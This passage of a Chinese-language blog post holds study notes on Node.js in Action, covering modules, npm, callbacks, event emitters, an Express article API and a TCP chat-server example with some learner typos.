function_\">urlencoded</span>(&#123;<span class=\"hljs-attr\">extended</span>:<span class=\"hljs-literal\">true</span>&#125;));<br><br><br>app.<span class=\"hljs-title function_\">get</span>(<span class=\"hljs-string\">&#x27;/articles&#x27;</span>,<span class=\"hljs-function\">(<span class=\"hljs-params\">req,res,next</span>)=&gt;</span>&#123;<br>    res.<span class=\"hljs-title function_\">send</span>(articles);<br>&#125;);<br><br>app.<span class=\"hljs-title function_\">get</span>(<span class=\"hljs-string\">&#x27;/articles/:id&#x27;</span>,<span class=\"hljs-function\">(<span class=\"hljs-params\">req,res,next</span>)=&gt;</span>&#123;<br>    <span class=\"hljs-keyword\">const</span> id=req.<span class=\"hljs-property\">params</span>.<span class=\"hljs-property\">id</span>;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Fetching article &quot;</span>,id,<span class=\"hljs-string\">&quot;.&quot;</span>);<br>    res.<span class=\"hljs-title function_\">send</span>(articles[id]);<br>&#125;);<br><br>app.<span class=\"hljs-title function_\">delete</span>(<span class=\"hljs-string\">&#x27;/articles/:id&#x27;</span>,<span class=\"hljs-function\">(<span class=\"hljs-params\">req,res,next</span>)=&gt;</span>&#123;<br>    <span class=\"hljs-keyword\">const</span> id=req.<span class=\"hljs-property\">params</span>.<span class=\"hljs-property\">id</span>;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Deleting article &quot;</span>,id,<span class=\"hljs-string\">&quot;.&quot;</span>);<br>    <span class=\"hljs-keyword\">delete</span> articles[id];<br>    res.<span class=\"hljs-title function_\">send</span>(&#123;<span class=\"hljs-attr\">message</span>:<span class=\"hljs-string\">&#x27;Article has been deleted.&#x27;</span>&#125;);<br>&#125;);<br><br>app.<span class=\"hljs-title function_\">post</span>(<span class=\"hljs-string\">&#x27;/articles&#x27;</span>,<span class=\"hljs-function\">(<span class=\"hljs-params\">req,res,next</span>)=&gt;</span>&#123;<br>    <span class=\"hljs-keyword\">const</span> article=&#123;<span class=\"hljs-attr\">title</span>:req.<span class=\"hljs-property\">body</span>.<span class=\"hljs-property\">title</span>&#125;;<br>    articles.<span class=\"hljs-title function_\">push</span>(article);<br>    res.<span class=\"hljs-title function_\">send</span>(articles);<br>&#125;);<br><br>app.<span class=\"hljs-title function_\">listen</span>(app.<span class=\"hljs-title function_\">get</span>(<span class=\"hljs-string\">&#x27;port&#x27;</span>),<span class=\"hljs-function\">()=&gt;</span>&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&#x27;App started on port &#x27;</span>,app.<span class=\"hljs-title function_\">get</span>(<span class=\"hljs-string\">&#x27;port&#x27;</span>));<br>&#125;);<br><br><span class=\"hljs-variable language_\">module</span>.<span class=\"hljs-property\">exports</span>=app;<br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p>到这一步为止，跟真正的Web程序差不多了，只需要完成两个新的任务：</p>\n<p>永久保存数据到数据库；</p>\n<p>形成可读版本的文章；</p>\n</blockquote>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\"><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">模板引擎</span><br>npm install ejs --save<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-Node-Web开发\"><a href=\"#2-Node-Web开发\" class=\"headerlink\" title=\"2.Node Web开发\"></a>2.Node Web开发</h3><blockquote>\n<p>现代Web开发中，使用Node来进行工具和服务的情况越来越多；</p>\n<p>需要负责和配置维护工具库；</p>\n<p>本章使用npm脚本、Gulp和Webpack搭建易于维护的项目；</p>\n</blockquote>\n<h4 id=\"前端构建工具的优点：\"><a href=\"#前端构建工具的优点：\" class=\"headerlink\" title=\"前端构建工具的优点：\"></a>前端构建工具的优点：</h4><ul>\n<li>代码简单易懂；</li>\n<li>支持代码转译；</li>\n<li>源码映射；</li>\n</ul>\n<h4 id=\"Webpck\"><a href=\"#Webpck\" class=\"headerlink\" title=\"Webpck\"></a>Webpck</h4><ul>\n<li>快速搭建支持增量式结构的构建系统；</li>\n</ul>\n<h2 id=\"五、服务器端框架\"><a href=\"#五、服务器端框架\" class=\"headerlink\" title=\"五、服务器端框架\"></a>五、服务器端框架</h2><ul>\n<li>使用热门的Node Web框架；</li>\n<li>选择合适的框架；</li>\n<li>用Web框架搭建Web程序；</li>\n</ul>\n<h4 id=\"1-用户画像\"><a href=\"#1-用户画像\" class=\"headerlink\" title=\"1.用户画像\"></a>1.用户画像</h4><blockquote>\n<p>假设一个场景，需要做一个内容分发系统，用户需要上传下载法律文件，在线阅读文件；</p>\n<p>徐娅萍生成PDF还有电子商务组件，你会怎么考虑技术栈？</p>\n</blockquote>\n<ul>\n<li>文件上传下载阅读–Express</li>\n<li>生成PDF的微服务–hapi</li>\n<li>电子商务组件–SailJS</li>\n</ul>\n<p>使用用户画像考虑设计问题是通用做法。</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"NoDe-JS-实战\"><a href=\"#NoDe-JS-实战\" class=\"headerlink\" title=\"NoDe JS 实战\"></a>NoDe JS 实战</h1><h2 id=\"一、Welcome-to-node\"><a href=\"#一、Welcome-to-node\" class=\"headerlink\" title=\"一、Welcome to node\"></a>一、Welcome to node</h2><h3 id=\"1-NodeJS基础\"><a href=\"#1-NodeJS基础\" class=\"headerlink\" title=\"1.NodeJS基础\"></a>1.NodeJS基础</h3><ul>\n<li>显著特征：异步、事件驱动机制</li>\n<li>Node和JS的优势之一是单线程编程。为了实现同步，引入事件机制，点击按钮，触发事件，规避资源死锁和竞态条件</li>\n<li>非阻塞I/O</li>\n</ul>\n<blockquote>\n<p>程序可以在做其他事情的时候发起一个请求来获取网络资源，然后网络操作完成之后，运行一个回调函数来处理操作的结果</p>\n</blockquote>\n<ul>\n<li>Node与V8</li>\n</ul>\n<blockquote>\n<p>Node的动力源自V8引擎。V8的特性之一是会将JS代码直接编译为机器码。</p>\n</blockquote>\n<ul>\n<li><p>特性组</p>\n<blockquote>\n<p>Node包含了v8提供的ES6特性，分为shipping、staged、in progress三组；</p>\n<p>其中shipping是默认开启的，staged和in progress需要命令行参数开启</p>\n</blockquote>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">node --harmony<br>node --v8-options | grep &quot;in progress&quot;<br></code></pre></td></tr></table></figure></li>\n<li><p>npm</p>\n<blockquote>\n<p> npm要求Node项目目录下有一个package.json文件；</p>\n</blockquote>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">npm init -y    //初始化package.json<br></code></pre></td></tr></table></figure></li>\n<li><p>核心模块</p>\n</li>\n</ul>\n<blockquote>\n<p>fs，path，net，http/s，dns，assert，os</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><br><span class=\"hljs-comment\">//调取文件流</span><br><span class=\"hljs-keyword\">const</span> fs=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;fs&#x27;</span>);<br><span class=\"hljs-keyword\">const</span> zlib=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;zlib&#x27;</span>);<br><span class=\"hljs-keyword\">const</span> gzip=zlib.<span class=\"hljs-title function_\">createGzip</span>();<br><span class=\"hljs-keyword\">const</span> outStream=fs.<span class=\"hljs-title function_\">createWriteStream</span>(<span class=\"hljs-string\">&#x27;output.js.gz&#x27;</span>);<br><br>fs.<span class=\"hljs-title function_\">createReadStream</span>(<span class=\"hljs-string\">&#x27;./fs.js&#x27;</span>).<span class=\"hljs-title function_\">pipe</span>(gzip).<span class=\"hljs-title function_\">pipe</span>(outStream);<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//网络模块</span><br><span class=\"hljs-keyword\">const</span> http=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;http&#x27;</span>);<br><span class=\"hljs-keyword\">const</span> port=<span class=\"hljs-number\">8080</span>;<br><br><span class=\"hljs-keyword\">const</span> server=http.<span class=\"hljs-title function_\">createServer</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">req,res</span>)=&gt;</span>&#123;<br>    res.<span class=\"hljs-title function_\">end</span>(<span class=\"hljs-string\">&quot;HEllo,node js!&quot;</span>);<br>&#125;);<br><br>server.<span class=\"hljs-title function_\">listen</span>(port,<span class=\"hljs-function\">()=&gt;</span>&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Server listening on:http://localhost:%s&quot;</span>,port);<br>&#125;);<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">//调试器<br>node debug server.js<br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>主流Node程序：Web、命令行工具、桌面程序 </li>\n</ul>\n<blockquote>\n<p>Node可以将TS转换为JS；</p>\n</blockquote>\n<h2 id=\"二、Node编程基础\"><a href=\"#二、Node编程基础\" class=\"headerlink\" title=\"二、Node编程基础\"></a>二、Node编程基础</h2><ul>\n<li>如何组织代码？</li>\n<li>如何实现异步编程？</li>\n</ul>\n<h3 id=\"1-Node功能的组织及重用\"><a href=\"#1-Node功能的组织及重用\" class=\"headerlink\" title=\"1.Node功能的组织及重用\"></a>1.Node功能的组织及重用</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/05/b3bf8ebded4c5d97.jpg\"></p>\n<blockquote>\n<p>上面的做法会出现一个问题，就是两个文件声明了相同的变量名，导致重复声明；</p>\n<p>PHP和Ruby等语言使用命名空间来解决问题；</p>\n<p>Node选择不给程序员污染全局命名空间的机会；</p>\n<p>Node模块允许从被引入文件中选择要暴露给程序的函数和变量，如果模块返回的函数或者变量不止一个，那么可以通过设定exports对象的属性来指明他们。</p>\n</blockquote>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/05/40f820b01ac722a9.jpg\"></p>\n<h3 id=\"2-创建一个Node项目\"><a href=\"#2-创建一个Node项目\" class=\"headerlink\" title=\"2.创建一个Node项目\"></a>2.创建一个Node项目</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">mkdir myApp<br>cd myApp<br>npm init -y   //全部使用默认值的package<br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p>require是Node中少数几个同步I/O操作之一；</p>\n<p>I/O密集的地方尽量不要使用require，所有的同步调用都会阻塞Node；</p>\n</blockquote>\n<h3 id=\"3-node-modules重用模块\"><a href=\"#3-node-modules重用模块\" class=\"headerlink\" title=\"3. node_modules重用模块\"></a>3. node_modules重用模块</h3><blockquote>\n<p>要求模块在文件系统中使用相对路径存放，对于组织程序特定的代码很有帮助。但是对于想要在程序见共享或者跟他人共享代码却用处不大。</p>\n<p>Node有一个独特的模块引入机制，即node_modules,其模块检索规则如下：</p>\n</blockquote>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/07/4accd465166d6500.jpg\"></p>\n<h5 id=\"注意事项：\"><a href=\"#注意事项：\" class=\"headerlink\" title=\"注意事项：\"></a>注意事项：</h5><ul>\n<li>如果模块是目录，在模块目录中定义模块的文件必须命名为index.js。除非在这个目录下一个叫package.json的文件特别执行。要执行一个取代index.js的文件，必须使用JSON数据定义的对象；</li>\n</ul>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs json\"><span class=\"hljs-punctuation\">&#123;</span><br>    <span class=\"hljs-attr\">&quot;main&quot;</span><span class=\"hljs-punctuation\">:</span><span class=\"hljs-string\">&quot;currency.js&quot;</span><br><span class=\"hljs-punctuation\">&#125;</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/07/eb62dc14f1e8a0e5.jpg\"></p>\n<ul>\n<li>Node能把模块作为对象缓存起来。如果两个文件引入了相同的模块，第一个require会把模块返回的数据存到内存中。第二个引入会从内存中加载。</li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/07/3baf64653ff8e710.jpg\"></p>\n<h5 id=\"！！！！！！不能实现\"><a href=\"#！！！！！！不能实现\" class=\"headerlink\" title=\"！！！！！！不能实现\"></a>！！！！！！不能实现</h5><h3 id=\"4-异步编程\"><a href=\"#4-异步编程\" class=\"headerlink\" title=\"4.异步编程\"></a>4.异步编程</h3><p>Node世界的两种响应逻辑方式：</p>\n<ul>\n<li>回调：通常用来定义一次性响应的逻辑。比如数据库查询；</li>\n<li>事件监听：本质上也是一个回调，不同的是和一个概念实体有关（事件）；</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//下面的例子中，用EventEmitter.Prototype.on方法在服务器上绑定了一个监听器，当有request事件发出，服务器调用handleRequest函数</span><br><br>server.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">&#x27;request&#x27;</span>,handleRequest);<br></code></pre></td></tr></table></figure>\n\n<p>Node Http服务器实例是一个事件发射器，一个可以类（Event Emitter）；</p>\n<p>Node的很多核心功能都继承自EventEmitter；</p>\n<h5 id=\"用回调处理一次性事件\"><a href=\"#用回调处理一次性事件\" class=\"headerlink\" title=\"用回调处理一次性事件\"></a>用回调处理一次性事件</h5><blockquote>\n<p>回调是一个函数，被当作参数传递给异步函数，用来描述异步操作完成之后要做什么。</p>\n</blockquote>\n<p>实例如下：</p>\n<ul>\n<li>异步获取存放在json文件中的文章标题</li>\n<li>异步获取简单的HTML模板</li>\n<li>将标题组装到HTML页面里</li>\n<li>将HTML发送给客户</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;http&#x27;</span>);<br><span class=\"hljs-keyword\">const</span> fs=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;fs&#x27;</span>);<br><br>http.<span class=\"hljs-title function_\">createServer</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">req,res</span>)=&gt;</span>&#123;<br>    <span class=\"hljs-title function_\">getTitles</span>(res);<br>&#125;).<span class=\"hljs-title function_\">listen</span>(<span class=\"hljs-number\">8000</span>,<span class=\"hljs-string\">&#x27;127.0.0.1&#x27;</span>);<br><br><span class=\"hljs-comment\">//将回调嵌套的功能代码提取出来</span><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">getTitles</span>(<span class=\"hljs-params\">res</span>)&#123;<br>    fs.<span class=\"hljs-title function_\">readFile</span>(<span class=\"hljs-string\">&#x27;./data/title.json&#x27;</span>,<span class=\"hljs-function\">(<span class=\"hljs-params\">err,data</span>)=&gt;</span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(err) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-title function_\">hadError</span>(err,res);<br>        <span class=\"hljs-title function_\">getTemplate</span>(<span class=\"hljs-title class_\">JSON</span>.<span class=\"hljs-title function_\">parse</span>(data.<span class=\"hljs-title function_\">toString</span>()),res);<br>    &#125;);<br>&#125;<br><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">getTemplate</span>(<span class=\"hljs-params\">titles,res</span>)&#123;<br>    fs.<span class=\"hljs-title function_\">readFile</span>(<span class=\"hljs-string\">&#x27;./index.html&#x27;</span>,<span class=\"hljs-function\">(<span class=\"hljs-params\">err,data</span>)=&gt;</span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(err) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-title function_\">hadError</span>(err,res);<br>        <span class=\"hljs-title function_\">formatHtml</span>(titles,data.<span class=\"hljs-title function_\">toString</span>(),res);<br>    &#125;)<br>&#125;<br><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">formatHtml</span>(<span class=\"hljs-params\">titles,templ,res</span>)&#123;<br>    <span class=\"hljs-keyword\">const</span> html=templ.<span class=\"hljs-title function_\">replace</span>(<span class=\"hljs-string\">&#x27;%&#x27;</span>,titles.<span class=\"hljs-title function_\">join</span>(<span class=\"hljs-string\">&#x27;&lt;/li&gt;&lt;li&gt;&#x27;</span>));<br>    res.<span class=\"hljs-title function_\">writeHead</span>(<span class=\"hljs-number\">200</span>,&#123;<span class=\"hljs-string\">&#x27;Content-Type&#x27;</span>:<span class=\"hljs-string\">&#x27;text/html&#x27;</span>&#125;);<br>    res.<span class=\"hljs-title function_\">end</span>(html);<br>&#125;<br><br><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title function_\">hadError</span>(<span class=\"hljs-params\">err,res</span>)&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(err);<br>    res.<span class=\"hljs-title function_\">end</span>(<span class=\"hljs-string\">&quot;Server Error&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"用事件发射器处理重复性事件\"><a href=\"#用事件发射器处理重复性事件\" class=\"headerlink\" title=\"用事件发射器处理重复性事件\"></a>用事件发射器处理重复性事件</h5><blockquote>\n<p>事件发射器会触发事件，并且在那些事件被触发时能处理他们；</p>\n<p>重要的Node API组件，比如HTTP服务器、TCP服务器和流都被做成了事件发射器；</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\">socket.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">&#x27;data&#x27;</span>,handleData)<br></code></pre></td></tr></table></figure>\n\n<p>echo服务器的例子：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> net=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;net&#x27;</span>);<br><span class=\"hljs-keyword\">const</span> server=net.<span class=\"hljs-title function_\">createServer</span>(<span class=\"hljs-function\"><span class=\"hljs-params\">socket</span>=&gt;</span>&#123;<br>    socket.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">&#x27;data&#x27;</span>,<span class=\"hljs-function\"><span class=\"hljs-params\">data</span>=&gt;</span>&#123;<br>        socket.<span class=\"hljs-title function_\">write</span>(<span class=\"hljs-string\">&quot;Your message is: &quot;</span>+data+<span class=\"hljs-string\">&quot;.\\n&quot;</span>);<br>    &#125;);<br>    <span class=\"hljs-comment\">//只响应一次</span><br>    socket.<span class=\"hljs-title function_\">once</span>(<span class=\"hljs-string\">&#x27;data&#x27;</span>,<span class=\"hljs-function\"><span class=\"hljs-params\">data</span>=&gt;</span>&#123;<br>        socket.<span class=\"hljs-title function_\">write</span>(<span class=\"hljs-string\">&quot;Your message is: &quot;</span>+data+<span class=\"hljs-string\">&quot;.\\n&quot;</span>);<br>    &#125;);<br>&#125;);<br><br>server.<span class=\"hljs-title function_\">listen</span>(<span class=\"hljs-number\">8000</span>,<span class=\"hljs-string\">&#x27;127.0.0.1&#x27;</span>);<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">telnet 127.0.0.1 8888<br></code></pre></td></tr></table></figure>\n\n<h5 id=\"一个PUB-SUB的例子\"><a href=\"#一个PUB-SUB的例子\" class=\"headerlink\" title=\"一个PUB/SUB的例子\"></a>一个PUB/SUB的例子</h5><p>下面的代码定义了channel事件发射器，并带有一个监听器，可以监听channel中发生的事件并做出响应；</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-comment\">//定义</span><br><span class=\"hljs-keyword\">const</span> <span class=\"hljs-title class_\">EventEmitter</span>=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;events&#x27;</span>).<span class=\"hljs-property\">EventEmitter</span>;<br><span class=\"hljs-keyword\">const</span> channel=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">EventEmitter</span>();<br>channel.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">&#x27;join&#x27;</span>,<span class=\"hljs-function\">()=&gt;</span>&#123;<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">&quot;Welcome!&quot;</span>);<br>&#125;)<br><br><span class=\"hljs-comment\">//触发事件/发射事件/join是事件名称，可以为任何值</span><br>channel.<span class=\"hljs-title function_\">emit</span>(<span class=\"hljs-string\">&#x27;join&#x27;</span>);<br></code></pre></td></tr></table></figure>\n\n<p>完整实现代码如下（存在只能输出一个字符的问题，似乎需要上缓存）：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> events=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;events&#x27;</span>);<br><span class=\"hljs-keyword\">const</span> net=<span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">&#x27;net&#x27;</span>);<br><span class=\"hljs-keyword\">const</span> channel=<span class=\"hljs-keyword\">new</span> events.<span class=\"hljs-title class_\">EventEmitter</span>();<br><span class=\"hljs-keyword\">var</span> fullMessage=<span class=\"hljs-string\">&quot;&quot;</span>;<br><br>channel.<span class=\"hljs-property\">clients</span>=&#123;&#125;;<br>channel.<span class=\"hljs-property\">subscriptions</span>=&#123;&#125;;<br><br>channel.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">&#x27;join&#x27;</span>,<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">id,client</span>)&#123;<br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">clients</span>[id]=client;<br>    <span class=\"hljs-keyword\">const</span> welcomeMessage=<span class=\"hljs-string\">`Welcome! <span class=\"hljs-subst\">$&#123;<span class=\"hljs-variable language_\">this</span>.listeners(<span class=\"hljs-string\">&#x27;broadcase&#x27;</span>).length+<span class=\"hljs-number\">1</span>&#125;</span> guests online!`</span>;<br>    client.<span class=\"hljs-title function_\">write</span>(<span class=\"hljs-string\">`<span class=\"hljs-subst\">$&#123;welcomeMessage&#125;</span>\\n`</span>);<br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">subscriptions</span>[id]=<span class=\"hljs-function\">(<span class=\"hljs-params\">senderId,message</span>)=&gt;</span>&#123;<br>        <span class=\"hljs-keyword\">if</span>(id!=senderId)&#123;<br>            <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">clients</span>[id].<span class=\"hljs-title function_\">write</span>(<span class=\"hljs-string\">&quot;Message from user &quot;</span>+id+<span class=\"hljs-string\">&quot;:&quot;</span>+message+<span class=\"hljs-string\">&quot;.\\n&quot;</span>);<br>        &#125;<br>    &#125;;<br>    <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">&#x27;broadcase&#x27;</span>,<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">subscriptions</span>[id]);<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">`<span class=\"hljs-subst\">$&#123;id&#125;</span> has enter the chatroom.\\n`</span>);<br>    channel.<span class=\"hljs-title function_\">emit</span>(<span class=\"hljs-string\">&#x27;boradcast&#x27;</span>,id,<span class=\"hljs-string\">`<span class=\"hljs-subst\">$&#123;id&#125;</span> has enter the chatroom.\\n`</span>);<br>&#125;);<br><br><span class=\"hljs-comment\">//绑定leave事件；</span><br>channel.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">&#x27;leave&#x27;</span>,<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">id</span>)&#123;<br>    channel.<span class=\"hljs-title function_\">removeListener</span>(<span class=\"hljs-string\">&#x27;broadcast&#x27;</span>,<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">subscriptions</span>[id]);<br>    <span class=\"hljs-variable language_\">console</span>.<span class=\"hljs-title function_\">log</span>(<span class=\"hljs-string\">`<span class=\"hljs-subst\">$&#123;id&#125;</span> has left the chatroom.\\n`</span>);<br>    channel.<span class=\"hljs-title function_\">emit</span>(<span class=\"hljs-string\">&#x27;boradcast&#x27;</span>,id,<span class=\"hljs-string\">`<span class=\"hljs-subst\">$&#123;id&#125;</span> has left the chatroom.\\n`</span>);<br>&#125;);<br><br><span class=\"hljs-comment\">//绑定lshuwdown事件,提出所有用户；</span><br>channel.<span class=\"hljs-title function_\">on</span>(<span class=\"hljs-string\">&#x27;shutdown&#x27;</span>,<span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">id</span>)&#123;<br>    channel.<span class=\"hljs-title function_\">emit</span>(<span class=\"hljs-string\">&#x27;broadcast&#x27;</span>,<span class=\"hljs-string\">&#x27;&#x27;</span>,<span class=\"hljs-string\">&#x27;The server has shut down.\\n&#x27;</span>);<br>    <span class=\"hljs-variable 